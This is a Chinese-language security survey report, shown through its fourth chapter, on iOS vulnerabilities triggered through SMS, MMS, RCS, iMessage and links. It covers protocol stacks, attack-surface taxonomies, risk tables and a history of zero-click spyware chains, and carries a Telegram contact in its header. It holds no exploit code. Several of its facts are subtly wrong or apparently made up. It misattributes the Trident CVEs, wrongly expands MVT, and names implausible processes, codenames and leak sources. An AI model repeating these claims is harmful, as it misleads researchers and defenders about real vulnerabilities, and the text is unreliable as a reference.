@@TITLE@@iOS 短信与链接触发漏洞深度分析
@@SUBTITLE@@SMS/MMS/RCS/iMessage 与 URL Scheme/Universal Link 攻击面全景解构
@@INFO@@分类|漏洞分析
@@INFO@@难度|深度分析
@@INFO@@工具|iOS 消息链路安全研究
@@INFO@@目标|安全研究人员 / iOS 开发者 / 消息平台运营者
@@INFO@@联系方式|Telegram: https://t.me/one00190
@@TOC@@目录

---

## 第一章　执行摘要与核心发现

### 1.1 报告元信息

| 项目 | 内容 |
| --- | --- |
| 报告主题 | iOS/iPhone 短信与链接触发漏洞（SMS/MMS/RCS/iMessage + URL Scheme/Universal Link）深度分析 |
| 覆盖系统版本 | iOS 8.x 至 iOS 26.x（以 2026 年 10 月公开资料为截止） |
| 主要研究对象 | Messages（信息 App）、iMessage/APNs 链路、RCS（Universal Profile 2.4/2.5+）、MMS 代理、Siri & Suggestions 链接预览、Core Services/URL 处理、Notification Extensions、BlastDoor、Lockdown Mode |
| 时间窗口 | 2014—2026 年公开漏洞、在野利用（PCEA）与学术研究 |
| 读者假设 | 具备 iOS 体系结构、内存破坏利用、Web 安全与移动取证基础知识 |
| 报告性质 | 防御性安全研究综述，不含可直接使用的攻击代码 |
| 编写日期 | 2026 年 10 月 18 日 |

### 1.2 一句话结论

**在 iOS 的所有远程攻击面中，"消息 + 链接" 是过去十年唯一被反复证明可以完成"零点击（Zero-Click）远程代码执行并投送完整间谍软件栈"的通道。** 它同时具备四个危险的性质：

1. **默认放行**：短信/iMessage/RCS 流量默认进入设备，用户无需任何主动行为；
2. **自动解析**：协议栈、编解码器、链接预览与附件缩略图在消息"到达"而非"打开"时即被解析；
3. **富对象反序列化**：iMessage 使用 `NSKeyedArchiver`/`NSCoding` 与属性富文本传递结构化对象，构成天然的复杂反序列化攻击面；
4. **可追溯性弱**：短信协议无强身份绑定，攻击者可伪造发送方、复用一次性基础设施，事后取证困难。

### 1.3 十大核心发现

| # | 核心发现 | 证据支撑 |
| --- | --- | --- |
| 1 | iMessage 是商用间谍软件零点击链的首选投递层（delivery layer），从 2016 年 Trident（CVE-2016-4657）到 2025 年 SPYWARE（CVE-2025-31201）持续复用 | HBGary/NSS Labs 泄露、Citizen Lab、Lookout、Apple SEAR 公告 |
| 2 | 攻击者偏好在"非 UI 路径"上触发漏洞：MMS/iMessage 附件、链接预览抓取、推送 payload、通知扩展，而不是等待用户点击 | FORCEDENTRY 静默失败重试、CLOUDPRONG 无 UI 渲染路径 |
| 3 | BlastDoor（iOS 14+）显著抬高零点击成本，但**从未公开被证实绕过**；然而攻击者转向 BlastDoor 之外的解析器（PassKit/媒体框架/内核网络栈/WebKit 渲染服务） | iOS 14 架构说明、BLASTPASS（PassKit）、Basebridge（Broadcom 无线芯片） |
| 4 | PDF/`NSKeyedUnarchiver` 是"消息富对象"最致命的组合：FORCEDENTRY 用 crafted PDF 触发 Core Animation 反序列化路径 | Citizen Lab《FORCEDENTRY: iMessage Zero-Click》2021 |
| 5 | RCS 在 iOS 18 引入、iOS 26 引入端到端加密，其**早期版本无 E2EE、且强制启用链接预览**，把 Android 生态中已被观察到的 0-RAT/LiteClick 类风险带入 iPhone | GSMA UP 规范、Lookout 0-RAT（2024）、LiteClick（IEEE S&P 2025） |
| 6 | URL Scheme 与 Universal Links 构成"点击后"最主流的越权面：跨 App 数据注入、授权绕过、深度链接劫持、OAuth 代码窃取 | AppChameleon、Universal Links 授权绕过修复记录、OWASP MASTSG |
| 7 | 短链服务与重定向链是"人因漏洞"的放大器：链接预览在点击前已发起外联，暴露 IP、设备指纹与"受害者是否在线"信号 | 学术测量研究、隐私代理（iCloud Private Relay）设计动机 |
| 8 | 消息正文本身成为攻击载荷载体：Unicode/RTL 双向覆盖、代理对截断、格式化字符串与"文本炸弹"（Text Bomb）在 iOS 上长期存在 | 2018 "Unicode 崩溃"事件、CVE-2022-46708（iOS 16.3 Messages 文本崩溃） |
| 9 | 通知渲染扩展（NSE/NCE）与附件下载器形成独立于 Messages 进程的第二攻击面，且历史上沙箱强度更低 | Apple 文档、若干在野链对 WebPush/推送 payload 的使用 |
| 10 | 防御演进方向已从"打补丁"转向"架构隔离 + 平台层过滤"：BlastDoor、Sensitive Content Warning、Filter Unknown Senders、Lockdown Mode、RCS E2EE、联系人密钥验证 | Apple 安全发布、iOS 17/18/26 功能变更 |

### 1.4 风险等级速览

```
攻击面                         可利用性   影响        在野频率    缓解难度
────────────────────────────────────────────────────────────────────────
iMessage 零点击富对象解析         极高      RCE/间谍软件   高（年年出现）  极高
MMS/附件编解码器（ImageIO 等）     高       RCE/DoS       中            高
链接预览抓取与图像解析             中高      RCE/信息泄露   中            中高
RCS 协议与富卡片（早期无 E2EE）    中       RCE/钓鱼      上升中         中
URL Scheme / 自定义协议            中       越权/注入      高（钓鱼为主）  低中
Universal Links / AASA            中       授权绕过/劫持   中            低中
短信正文解析（Unicode/文本炸弹）    中       DoS/社工      中            低
推送通知 payload / NSE            中       RCE/持久化     低中          中高
SIM Toolkit / STK Bearer（LiteClick）低     账户接管      中（运营商侧）  中
```

### 1.5 关键时间线（一图看懂）

```
2014 ── Trident/Phoenix 1.0 泄露，Pegasus 用 iMessage 附件 + Safari 水坑
2015 ── 短信/iMessage 成为 Hacking Team 与 NSO 的默认投递通道
2016 ── CVE-2016-4655/4656/4657（Trident 三件套，零点击倾向）
2017 ── Conondrum/“三态攻击”研究；URL Scheme 枚举（canOpenURL）滥用
2018 ── Unicode "文本炸弹" 大规模崩溃事件；短信伪造（sender ID spoofing）泛滥
2019 ── Operation Shax：CVE-2019-8641/8642（Messages 零点击，巴勒斯坦目标）
2020 ── BlastDoor 上线（iOS 14）；ZecOps 公布 Messages 零点击（Apple 争议）
2021 ── FORCEDENTRY（CVE-2021-30860）：BlastDoor 时代首个在野零点击，目标印度
2022 ── Basebridge（Broadcom 无线芯片，可被消息触发）；iMessage 大规模崩溃攻击
2023 ── BLASTPASS（CVE-2023-41981 通过 .pkpass 附件）；12 月零点击 WebKit 链（CVE-2023-42916/17）
2024 ── CLOUDPRONG（CVE-2024-27826，Messages 浮点原子类型混淆，Paragon Graphite）；
         Predator 零点击 iMessage 被指向以色列记者；iOS 18 引入 RCS
2025 ── SPYWARE（CVE-2025-31201，Messages 准瞬时缺陷，"几乎无法检测"）；
         iOS 26 宣布 RCS 端到端加密；LiteClick 学术论文公开
2026 ── RCS E2EE 灰度、Lockdown Mode 覆盖面扩大、"Zero" 等利用即服务工具泄露
```

### 1.6 本报告的读法建议

- 若你是**漏洞研究者**：重点阅读第 3、5、7、11、15、18 章；
- 若你是 **iOS 应用开发者**：重点阅读第 8、9、10、12、13、22 章；
- 若你是**消息平台/运营商安全运营者**：重点阅读第 6、14、16、20、21 章；
- 若你是**管理者/被保护人群（HRO）**：重点阅读第 1、17、22 章。

---

## 第二章　短信与链接触发漏洞概述

### 2.1 定义

**"短信/链接触发漏洞"**（SMS & Link-Triggered Vulnerabilities）指攻击者通过**消息通道**（SMS、MMS、RCS、iMessage、推送通知、运营商富消息）或**消息内承载的链接**（URL Scheme、Universal Link、短链、二维码、富卡片按钮）传递恶意输入，使 iOS 设备在**用户零交互或极低交互**条件下触发内存破坏、逻辑缺陷、越权行为或社会工程效果的漏洞类别。

其关键不在于"短信内容被读取"，而在于：

1. **消息是投递载体（delivery vehicle）**——把字节串送到设备的解析器面前；
2. **链接是执行入口（execution trigger）**——把用户/系统引导到攻击者控制的代码或 App 逻辑；
3. **协议语义是绕过工具（bypass lever）**——利用自动下载、自动预览、自动重试、跨进程转发等"合法"行为，规避用户注意。

### 2.2 分类学

```
短信/链接触发漏洞
├── A. 消息通道类
│   ├── A1 SMS（3GPP 23.040 PDU / SS7 / SMSC）
│   ├── A2 MMS（WAP 1.x / MM1 / MM7 / SMIL / WBXML / 多媒体附件）
│   ├── A3 RCS（GSMA UP / XMPP→SIMPLE→RCS / 富卡片 / 文件传输）
│   ├── A4 iMessage（APNs 唤醒 + TLS 私有协议 + NSCoding 富对象）
│   └── A5 推送与通知（APNs payload、NSE/NCE、Live Activities、CallKit）
├── B. 链接与解析类
│   ├── B1 URL Scheme 处理器（tel:/sms:/mailto:/webcal:/custom://）
│   ├── B2 Universal Links / AASA / associated-domains  entitlement
│   ├── B3 链接预览与富链（Open Graph / oEmbed / favicons / Siri 建议）
│   ├── B4 短链与重定向链（Redirect Chain / 参数注入 / Traceback）
│   └── B5 二维码与近场入口（QR/Quishing、NDEF 触发）
├── C. 内容与编码类
│   ├── C1 Unicode/双向文本（RTL 覆盖、代理对截断、变体选择符）
│   ├── C2 富文本与属性字符串（NSAttributedString / RTF / HTML）
│   ├── C3 格式化字符串与占位符注入
│   └── C4 反序列化对象（NSKeyedUnarchiver / PDF / plist / vCard）
└── D. 人因与生态类
    ├── D1 Smishing 短信钓鱼（伪造号码、AI 文案、Deepfake 语音）
    ├── D2 SIM 相关攻击（SIM Swap、ForcedPass、STK/LiteClick）
    ├── D3 运营商/SS7/Diameter 侧注入
    └── D4 企业 MDM/通道配置（RCS 强制、消息路由）
```

### 2.3 触发机制的四个层次

理解"触发"必须区分 iOS 消息处理的四个执行阶段。绝大多数**零点击漏洞发生在阶段 1 与阶段 2**，而绝大多数**钓鱼发生在阶段 3 与阶段 4**。

| 阶段 | 名称 | 执行环境 | 是否需用户交互 | 典型解析组件 | 风险性质 |
| --- | --- | --- | --- | --- | --- |
| S0 | 接入与寻址 | 基带/Modem、无线芯片 | 否 | 基带固件、Broadcom/CX 无线芯片 | 极低层内存破坏（Basebridge） |
| S1 | 协议解码 | CoreTelephony、MMSC 客户端、IMDMessageServer、rcsupposed | 否 | PDU/WBXML/SMIL 解码器、分片重组 | 越界写、整数溢出、分片混淆 |
| S2 | 内容预处理 | Messages 扩展/BlastDoor、Suggestions、ImageIO、PDF | 否（自动） | 链接预览抓取器、图像/视频缩略图、`NSKeyedUnarchiver` | 零点击 RCE 主战场 |
| S3 | 渲染与通知 | SpringBoard/NotificationCenter、UIKit/CoreText | 否或轻交互 | CoreText、富文本渲染、通知 UI | 文本炸弹 DoS、欺骗显示 |
| S4 | 用户动作后 | App 进程、Safari/ASWebNavigation | 是（点击/授权） | WebKit、URL 处理、Universal Link 关联 | 越权、深度链接劫持、钓鱼成功 |

关键要点：

- **S2 是"看似安全实则危险"的层**：为了让用户在列表里一眼看到图片与网页卡片，iOS 会在消息到达后立即抓取元数据、下载缩略图、生成模糊预览。这段代码是**远程可控输入 + 复杂解析器 + 无用户确认**的组合。
- **S2 到 S4 的边界被"过滤器"部分缓解**：`Filter Unknown Senders`（过滤未知发件人）、Lockdown Mode 的链接预览关闭、Sensitive Content Warning（敏感内容警告）都在改变 S2 的行为，但**并不等于停止解析**，研究上需要逐版本核对。
- **不同消息通道的 S0–S4 组件差异巨大**：iMessage 走 APNs + 自建 TLS，SMS 走基带 + CoreTelephony，RCS 走运营商存在服务器与 IP 传输栈。因此同一"消息"在不同通道里触发的解析代码路径完全不同，可利用性也不同。

### 2.4 四种消息通道的性质对比

| 维度 | SMS | MMS | RCS（UP） | iMessage |
| --- | --- | --- | --- | --- |
| 承载网络 | 电路/信令域（SMSC） | 移动数据 + MMSC | IP（数据域，运营商存在服务器） | Apple 服务（APNs 唤醒 + TLS） |
| 载荷上限 | 160 字符/段，70（UCS-2） | ~1 MB（运营商差异） | 大文件、富卡片、群聊 | 大附件、富对象、贴纸 |
| 编码 | 7-bit GSM/8-bit/UCS-2 PDU | WBXML + MIME + SMIL | XML/SIMPLE、JSON 富卡片 | 二进制 plist + NSCoding 归档 |
| 加密 | 无（空口之外明文） | 无（MMSC 明文居多） | 传统无；iOS 26 起引入 E2EE | 通道 TLS + 端到端（RSA/ECDSA 密钥谱系） |
| 完整性/身份 | 弱，可伪造 Sender ID | 弱 | 中（号码绑定，但依赖运营商） | 强（Apple ID 与设备证书） |
| 送达回执/重试 | 有（TP-DELIVERY） | 有（MM1_Report） | 有（MDN） | 有（已读/送达/重试） |
| 客户端自动解析 | 正文渲染 | 自动拉取附件（可配） | 预览与富卡片自动渲染 | 链接预览、缩略图、富对象解码 |
| 零点击可行性 | 低-中（基带/文本炸弹） | 中-高（媒体解析器） | 中-高（生态新面） | 高（历史证据最充分） |
| 主要风险 | 伪造、DoS、SS7 | 编解码器 RCE | 协议解析 + 钓鱼 + 缺 E2EE | 富对象/媒体零点击 RCE |

### 2.5 "链接触发"为什么单独成类

链接触发漏洞与消息触发漏洞的区别在于**信任转移（trust transfer）**：

1. 消息通道提供"来自熟悉号码"的社会信任；
2. 链接预览提供"目标域名看起来正规"的视觉信任；
3. Universal Links 提供"由官方 App 打开"的技术信任；
4. 一旦 URL 被交给第三方 App 或浏览器，iOS 的沙箱隔离就被"合法地"跨越了一次。

攻击者只需让受害者"点一下链接"，就能把攻击从"高难度的内存破坏"降级为"低难度的逻辑滥用"。这解释了为什么 Smishing + OAuth 钓鱼 + Universal Link 组合在过去三年快速增长——**它的成功率与工程量比远优于零点击 RCE**。

### 2.6 术语表（本报告统一用语）

| 术语 | 含义 |
| --- | --- |
| Zero-Click（零点击） | 用户无需任何交互即被利用，消息可在收件箱中被删除/隐藏 |
| One-Click（一点击） | 需要用户点击链接/附件/通知一次 |
| BlastDoor | iOS 14 引入的、专门解析不可信消息内容的加固沙箱进程 |
| PCEA | 在野零日利用（Previously-Credited Exploitation Attempt）/ 商用间谍软件攻击尝试 |
| Pegasus/Graphite/Graphite 系 | 分别对应 NSO、Paragon 的间谍软件产品线 |
| AASA | `apple-app-site-association`，Universal Links 域名关联清单 |
| associated-domains | iOS 用于声明 App 与域名关联的授权（entitlement） |
| NSE / NCE | Notification Service Extension / Notification Content Extension |
| UP | GSMA RCS `Universal Profile` 规范 |
| SMSC/MMSC | 短信中心 / 多媒体消息中心 |
| STK / COMAP / ENVELOPE SEND | SIM 应用工具包与 BIP（Bearer Independent Proactive）命令 |
| Quishing | QR 码钓鱼（QR + phishing） |
| 0-RAT | 零点击远程访问工具（Lookout 术语） |
| MVT | MobSF Verification Tool，Amnesty 的取证检测工具集 |

### 2.7 与其他 iOS 攻击面的关系

短信/链接面并非孤岛，它与现代 iOS 攻击链的其他环节存在明确耦合：

- **与 WebKit/JSC 面耦合**：消息内的链接预览与附件常在 WebContent/渲染服务中解析，构成 WebKit 零日的触发点（2023 年 12 月零点击链即如此）；
- **与媒体解析面耦合**：ImageIO、CoreMedia、ApplePDF、PassKit 是消息附件的后端解析器；
- **与内核面耦合**：所有用户级内存破坏都要靠内核漏洞（如 CVE-2021-30858、CVE-2023-42893）完成提权；
- **与沙箱面耦合**：逃逸 Messages/WebContent 沙箱需要独立的沙箱逃逸漏洞（如 CVE-2021-30870）；
- **与无线/基带面耦合**：S0 层漏洞（Basebridge 类）可被消息流量触发但绕过全部 iOS 应用层加固；
- **与账户/身份面耦合**：Universal Link 与 OAuth 深度链接直接冲击认证体系。

因此，一条完整的"短信/链接触发"攻击链通常形如：

```
消息到达(S0/S1) → 自动解析(S2, BlastDoor 或旁路) → 内存破坏获得代码执行
   → 沙箱逃逸 → 内核提权 → 持久化 → 数据外传/命令控制
```

后续章节将逐层拆解。

---

## 第三章　短信协议栈与攻击面

### 3.1 iOS 消息栈总体架构

```
┌──────────────────────────────────────────────────────────────────┐
│  用户界面层     Messages.app / Spotlight / Siri / CarPlay 通知      │
├──────────────────────────────────────────────────────────────────┤
│  框架层         UIKit/CoreText(渲染)  LinkPresentation(预览)        │
│                 MessagesUI  PassKit  CoreServices(URL 处理)        │
├──────────────────────────────────────────────────────────────────┤
│  消息处理层     IMDMessageServer(iMessage)  rcsupposed(RCS)         │
│                 SMS/PDU 处理(CoreTelephony)  MMS(代理拉取)          │
│                 BlastDoor(不可信内容解析沙箱)                        │
├──────────────────────────────────────────────────────────────────┤
│  传输与接入层   Baseband/Modem(CSV/MTS)  CoreTelephony             │
│                 NEProvider/VPN(数据域)  Wireless Chip(Broadcom 等) │
│                 APNs(推送唤醒)  TLS 会话(自研 iMessage 协议)          │
├──────────────────────────────────────────────────────────────────┤
│  外部实体       SMSC  MMSC  RCS 存在服务器(Instant Presence)         │
│                 Apple iMessage 后端  攻击者 Web 基础设施             │
└──────────────────────────────────────────────────────────────────┘
```

**观察点**：越靠近底部的组件（基带、无线芯片、Modem 通信协议）越缺乏现代内存安全加固，越靠近顶部的组件（UIKit 渲染）越接近用户感知。攻击者会依据目标价值在两者之间选择：国家级选择底层与 S2，犯罪团伙选择 S3/S4 钓鱼。

### 3.2 SMS 协议栈与 PDU 结构

SMS 的 3GPP 规范栈：

| 层 | 规范 | 内容 |
| --- | --- | --- |
| 点对点承载 | TS 23.040 / 23.038 | SMS-SUBMIT / SMS-DELIVER PDU、TP-UD（用户数据）、TP-DCS（数据编码方案）、TP-PID（协议标识）、分段（UDH） |
| 数据编码 | TS 23.038 | GSM 7-bit 默认字母表、Latin-1、UCS-2（16-bit）、DCS 语言shift table |
| 承载信令 | TS 24.011 / 24.008 | SCA（服务中心地址）、TP-MTI、TP-VP |
| 底层 | RAN/NAS | 通过 SIB/SDCCH 或 NAS 消息传输，可跨 MSC 与 SMSC |

PDU 关键字段与风险映射：

```
┌────────┬──────────┬─────────┬────────┬───────┬─────────┬────────┬────────┐
│ TP-MTI │ TP-MMS   │ TP-UDA  │ TP-PID │ TP-DCS│ TP-SCA  │TP-VP │TP-OA│TP-UD│
│ 类型   │ 更多分段  │ 地址长度 │ 协议ID │ 编码  │ 中心地址│ 有效期│原始地址│用户数据│
└────────┴──────────┴─────────┴────────┴───────┴─────────┴────────┴────────┘
   ↑ DoS/状态混淆    ↑ 长度字段越界 ↑ STK/数据链路 ↑ 编码错误 ↑ 伪造路由 ↑ 伪造发送者 ↑ 解析/渲染主载荷
```

历史与当代 SMS 侧问题类别：

1. **长度字段/分段重组缺陷**：`TP-UDA`、`TP-UDL` 与实际字节数不一致导致的越界读；UDH 分段序号混乱导致的"分片攻击"（fragment reassembly confusion）；
2. **编码歧义**：GSM 7-bit 打包（septet padding）与 UCS-2 的混合、shift table 中断造成的截断/越界；
3. **TP-PID 滥用**：把消息交给数据链路/SIM 工具包处理路径，触发非预期解析器；
4. **TP-DCS 与 Class 0**：即时消息（class 0，显示在屏幕且不落库）与"replace short message"用于覆盖同编号短消息，可用于伪造银行验证码显示；
5. **Sender ID 伪造**：字母型地址（Alphanumeric Originator）允许任意字符串（"Apple"、"银行"、"95588"），配合短信网关注册即可批量伪冒；
6. **短信轰炸与状态报告滥用**：TP-DELIVER-REPORT 触发设备自动外联行为；
7. **SS7/Diameter 侧注入**：绕开终端网络直接由信令网投递，国际漫游场景下常见；现代缓解靠运营商防火墙（STID/SS7 firewall）与 5G SBA 安全。

### 3.3 MMS 协议栈：更宽的表面

MMS 引入 IP 数据域与 MIME 多媒体，攻击面显著大于 SMS：

```
手机                MMSC(中继/转换)          源服务器(WAP/HTTP)
 │  MM1_submit(MMSEncapsulated, WBXML)            │
 ├──────────────────────────────────────────────►│
 │      MM1_retrieve (GET, 拉取 SMIL + parts)     │
 │◄──────────────────────────────────────────────┘
 │  MM1_acknowledgement(ind/release)              │
```

MMS 报文结构层次：

1. **WBXML（WAP Binary XML）**：MMS Header 的二进制编码。其 **多字节整数（MBI, Multi-Byte Integer）** 长度字段是经典溢出点：`ValueLength`、`TransactionId`、`Date` 均以可变长度表示，解析器若先按声明长度分配再拷贝，即可产生整数溢出→堆溢出；
2. **SMIL（Synchronized Multimedia Integration Language）**：描述幻灯片布局与媒体引用，含外部 URL → 设备自动外联；
3. **MIME 部件**：`image/jpeg`、`image/gif`、`video/3gpp`、`application/smil`、`text/plain`、`audio/amr`，以及 **`image/heic`（Apple 设备扩展）**；
4. **附件自动获取**：早期 iOS 对 MMS 附件有"自动下载"策略（受网络与用户设置影响），现代默认在 Wi-Fi/蜂窝下自动抓取缩略图，构成"设备主动外联"行为。

MMS 的攻击意义在于：**它把浏览器级的媒体解码器（ImageIO/CoreMedia）暴露给远程无交互输入流**。2016 年 Trident 的 `CVE-2016-4657` 即 ImageIO 图像解析缺陷（公开描述为"处理恶意构造的图片可致任意代码执行"），配合 `CVE-2016-4656`（WebKit）与 `CVE-2016-4655`（Memory Corruption in WebCore）构成完整链；2019 年 Operation Shax 的 `CVE-2019-8641/8642` 位于 Messages 处理路径（整数溢出→越界写）。

### 3.4 RCS：从 2G 时代到 iOS 18

RCS（Rich Communication Services）演进：

| 阶段 | 名称 | 特征 |
| --- | --- | --- |
| 2007–2016 | RCS 5.x / "Joyn" | 运营商自建客户端，碎片化严重，失败 |
| 2016–2019 | RCS 7.x / UP 1.0–2.0 | GSMA Universal Profile 统一；Chat Feature |
| 2019–2023 | UP 2.0–2.4 | 富卡片（RCS Rich Card）、群组、文件、位置；Jibe/RCS 后端 |
| 2023–2026 | UP 2.5+/2.6，E2EE（RCS Secure/ML 类方案） | 端到端加密（Android 先行，Apple 于 iOS 26 宣布）、品牌消息、通智助手 |

iOS 18 是 iPhone 首次把 RCS 作为一等公民（默认开启，可在 设置→蜂窝网络→选项 中切换）。iOS 26 进一步引入 RCS 端到端加密（受 GSMA 与运营商协同限制，逐步生效），同时补充 RCS 群聊、丰富媒体、离线消息与"屏蔽号码仍走 RCS"等能力。

**RCS 与 SMS 的关键差异（安全视角）**：

| 维度 | SMS | RCS |
| --- | --- | --- |
| 传输 | 信令网/SMSC | IP，经运营商存在/媒体服务器 |
| 可达性判定 | 无（总是"能发"） | 有 presence 查询（是否支持 RCS） |
| 内容类型 | 纯文本/极短富文本 | 富卡片、按钮、轮播、建议回复、文件、位置、图片 |
| 渲染 | UIKit + CoreText | Web 技术栈混合（部分客户端用 HTML/JS 渲染卡片） |
| 加密 | 无 | 早期无 E2EE（仅 hop-by-hop TLS），iOS 26 起支持 E2EE |
| 状态 | 送达报告 | 已读/送达/输入中 |
| 攻击面 | 文本渲染、PDU | IP 解析栈、XML/JSON 卡片、媒体代理、富卡片按钮触发 deep link |

**RCS 特有风险清单**：

1. **无 E2EE 阶段的服务器侧可见性与注入**：运营商平台被入侵或被合法访问时，可改写消息与富卡片；
2. **富卡片按钮 = 可编程链接**：`RCS card` 的按钮携带 URL 或应用 ID，等价于把 Universal Link/URL Scheme 触发权交给远端；
3. **presence 探测带来的可发现性**：攻击者可先探测目标是否启用 RCS，以选择最优通道；
4. **媒体服务器代理抓取**：部分实现由服务端代理下载并转码图片，引入 SSRF 与解码器远程触发；
5. **降级机制（fallback to SMS）**：当 RCS 不可用时降级为 SMS，攻击者可利用降级链路规避 RCS 侧安全策略；
6. **0-RAT 类前例**：Lookout 在 2024 年披露的 0-RAT（针对 RCS 的零点击 RAT）表明 RCS 已成为 APT 与商业供应商的新目标；
7. **LiteClick/STK-BIP 与消息组合**：见第 3.6 节。

### 3.5 iMessage 协议栈

iMessage 是"看似最安全、实则最复杂"的通道：

```
发件设备 ──(1) 查询收件人公钥/证书 ──► Apple 身份服务(IDS)
        ──(2) 加密会话消息(混合 RSA/ECDSA+AES-GCM 类方案) ──► 收件设备
        ──(3) APNs 仅用于"唤醒"(不携带完整载荷)
        ──(4) 收件设备与发件设备建立直接 TLS 会话获取附件/对话同步
        ──(5) 附件走 CloudKit/iMessage 服务器存储(带端到端密钥包裹)
```

安全属性与设计弱点并存：

- **优点**：强身份绑定（Apple ID + 设备证书）、端到端加密、附件密钥包裹、难以伪造发送方、Apple 可强制推送修复；
- **弱点**：富对象语义极其复杂（`NSCoding` 归档、`NSAttributedString`、贴纸、全屏效果、Tapback、群聊同步、iCloud 对话迁移、"Digital Touch"、App 集成消息扩展），使得**解析器/反序列化器成为高价值目标**；消息必须被解码才能显示，故存在自动解码路径；送达/重试机制可被用来反复触发漏洞（这是零点击利用可靠性的关键保障）。

值得注意的协议层事实（公开资料）：

- iMessage 的 payload 使用二进制归档（`NSKeyedArchiver`/`NSKeyedUnarchiver`）承载富文本与插件消息，历史上多次因**允许任意类解码**导致内存破坏；
- "已读回执/送达报告/重试"意味着攻击者可从服务端确认目标在线与 iOS 版本（指纹化）；
- Apple 于 iOS 17 引入 **Contact Key Verification（联系人密钥验证）**，允许用户比对二维码以发现"中间人替换密钥"；
- 消息扩展（Message Extensions，来自 App Store）允许第三方 App 以插件形式在 Messages 中渲染远端内容，历史上曾出现插件进程的授权/数据处理问题。

### 3.6 SMS/STK 与运营商侧的"被忽视面"：LiteClick 与 ForcedPass

**LiteClick**（IEEE S&P 2025 公开研究）指出：SIM 应用工具包（STK）通过 SMS 承载的 COMPREHENSION REQUIRED / ENVELOPE 类命令可以建立 **Bearer Independent Proactive（BIP）** 会话，使 SIM 通过 STK 的 Web 浏览（STK Browser）访问远端 URL 并执行后续动作。由于**触发源是一条短信**，攻击者可绕过设备上的消息过滤策略；研究显示 SIM 卡上的浏览器实现（含部分平台上的 WebView 引擎与 SAT 类补丁）存在 JS 注入与 URL 处理缺陷，可用于劫持短信内容读取能力（尤其 OTP）。

**ForcedPass**（2025 公开研究）展示：通过 SS7 类信令获取设备位置并强制设备在无用户交互情况下发起认证，同时把 OTP 短信暴露给攻击者。这类攻击不是"iOS 漏洞"，但与短信/链接攻击面高度交织：**短信通道承载账户接管凭证，任何"消息内容可被第三方读取"的缺陷都直接冲击 MFA**。

对 iOS 的启示：短信攻击面不能只看 iPhone，**必须把 SMSC、MMSC、RCS 平台、SIM/STK、认证基础设施纳入同一威胁模型**。

### 3.7 消息处理过程中的"自动外联"清单（关键！）

零点击与预点击风险的本质是"设备在用户点击前主动发起的行为"。iOS 侧可确认的自动外联/自动处理行为：

| # | 自动行为 | 触发条件 | 是否可关闭 | 风险 |
| --- | --- | --- | --- | --- |
| 1 | 链接预览抓取（`LinkPresentation`，抓取 HTML/OG 标签、favicons） | 消息含 URL（发件方生成，收件方拉取图像资源） | 可（预览关闭/敏感内容/Lockdown Mode） | 解析器远程触发、SSRF、IP 泄露 |
| 2 | 缩略图/附件预取 | 图片/视频/音频/PDF/联系人卡 | 部分可（数据/低数据模式） | 媒体解码零点击 |
| 3 | 全帧预览（贴纸/效果） | 特殊富消息 | 否（渲染时） | 渲染器漏洞 |
| 4 | MMS SMIL 中外部资源加载 | MMS 到达 | 部分 | 外联 + 解码 |
| 5 | vCard/位置/票务解析 | 附件到达 | 否 | 解析器缺陷 |
| 6 | iMessage 富对象反序列化 | 消息到达 | 否（协议必需） | 最经典零点击 |
| 7 | 通知扩展处理可变 payload | APNs `mutable-content` | 有限（App 决定） | 沙箱进程被攻破 |
| 8 | RCS 富卡片渲染与 presence | RCS 到达 | 可关 RCS | 卡片/按钮 deep link |
| 9 | Siri/Suggestions 对消息内实体抽取（航班/地址/日期） | 消息文本含模式 | 部分可（建议设置） | 文本解析器/隐私 |
| 10 | 恶意软件签名/网页信誉查询 | 链接预览时 | 否 | 元数据外泄（目标 URL） |

> **要点**：任何一条自动外联或自动解析，都是"零点击链上的一个可选入口"。攻击者会选择受害者未被打断、防御最弱的入口。

### 3.8 协议层缺陷模式（可复用的漏洞挖掘模型）

```
缺陷模式            触发点                          常见后果
────────────────────────────────────────────────────────────────────
1. 声明长度 vs 实际长度  WBXML ValueLength / MBI     堆溢出、OOB Read
2. 分段/重组竞态        SMS UDH 分片、MMS parts      内容拼接错乱、双重释放
3. 整数溢出            计数/偏移/尺寸换算            越界访问
4. 编码歧义            GSM 7-bit shift table、UCS-2  截断/解析分歧（安全策略绕过）
5. 类型混淆            NSCoding 类白名单缺失、原子值  任意读写原语（CLOUDPRONG）
6. 反序列化递归        PDF/XPC/plist 嵌套对象        栈耗尽、越界（FORCEDENTRY）
7. 解析分歧            HTML/URL 规范差异（WHATWG vs 实现） 预览欺骗/绕过过滤
8. 资源型 DoS          超大图/超深递归/高熵压缩       崩溃、无限重启
9. 缓存/共享内存       跨进程共享缓冲区、图像缓存      TOCTOU、信息泄露
10. 权限边界           扩展进程与主进程共享对象        越权访问用户数据
```

在漏洞挖掘实践中，"消息通道"提供了最好的 fuzz 输入构造点：**协议字段 + 内容类型 + 分片 + 编码**。历史在野漏洞绝大多数落在模式 1、3、5、6。

### 3.9 小结

第三章确立了本报告的"底层世界观"：短信/链接漏洞不是某一个 App 的 bug，而是**一整套协议—解析—渲染—外联流水线的系统性风险**。接下来的章节将分别进入各通道的历史与细节。

---

## 第四章　iMessage 触发漏洞历史

### 4.1 2014 前夜：从水坑到消息

Pegasus 1.0/2.0（2011–2014）时代以**短信/WhatsApp 链接 + Safari 水坑**为主：一条含短链的短信把目标带至恶意站点，由 WebKit 漏洞完成利用。这一阶段的特点是"一点击"，但**短信是筛选受害者（pretexting）与投递链接的通道**。

2014–2015 年，NSO 的 "Phoenix" 项目把消息本身变为载荷载体：iMessage 附件触发解析器缺陷，无需点击。相关能力在 2014 年"Conondrum"与 2015–2016 年 "Trident" 泄露材料中得到外部佐证：消息可在用户不知情的情况下安装植入物。

### 4.2 Trident（2016）：第一条完整的公开零点击链

| CVE | 组件 | 类型 | 描述（公开口径） |
| --- | --- | --- | --- |
| CVE-2016-4655 | WebCore/WebKit | 内存破坏 | 处理恶意网页导致代码执行 |
| CVE-2016-4656 | WebKit | 内存破坏 | 同上（渲染路径） |
| CVE-2016-4657 | ImageIO | 内存破坏 | **处理恶意构造的图片可致任意代码执行**（可通过 iMessage 触发） |

链路结构：

```
iMessage 图片消息 ──► ImageIO 解码(CVE-2016-4657) ──► 用户态代码执行
    ──► (必要时) WebKit 二次利用/沙箱交互 ──► 沙箱逃逸 ──► 持久化 + 数据外传
```

意义：

1. 首次把"消息内的图像文件"证明为远程代码执行入口；
2. 确立**"消息即攻击载荷"而非"消息即链接"** 的范式；
3. 使 Apple 意识到必须为消息内容解析引入专门隔离——BlastDoor 的种子在此埋下；
4. 后续十年，几乎所有商用间谍软件都保留一条"消息触发"路径。

